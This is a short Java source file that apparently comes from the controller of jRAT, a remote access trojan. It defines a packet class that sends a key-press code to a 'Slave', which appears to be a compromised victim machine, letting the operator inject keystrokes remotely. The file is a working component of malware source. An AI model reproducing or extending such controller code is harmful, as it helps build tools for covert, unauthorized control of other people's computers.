package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet94KeyPress extends AbstractOutgoingPacket {

	private int keyCode;

	public Packet94KeyPress(int keyCode) {
		this.keyCode = keyCode;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(keyCode);
	}

	@Override
	public short getPacketId() {
		return 94;
	}

}
